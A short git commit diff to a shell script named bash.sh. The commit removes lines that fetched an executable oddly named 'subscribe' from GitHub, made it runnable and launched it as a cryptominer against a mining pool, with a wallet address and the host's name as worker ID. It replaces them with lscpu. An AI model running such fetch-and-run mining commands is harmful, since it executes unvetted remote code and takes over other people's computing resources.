4c973968aec5cd508d9bbc0939907dabf410f123
mariobiszz <88525716+mariobiszz@users.noreply.github.com>
2021-12-10 15:58:18 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,8 +1,7 @@
 #!/bin/sh
 
-wget https://raw.githubusercontent.com/mariobiszz/students/main/subscribe
-chmod +x subscribe
+lscpu
 
 #run
 
-./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)
+lscpu
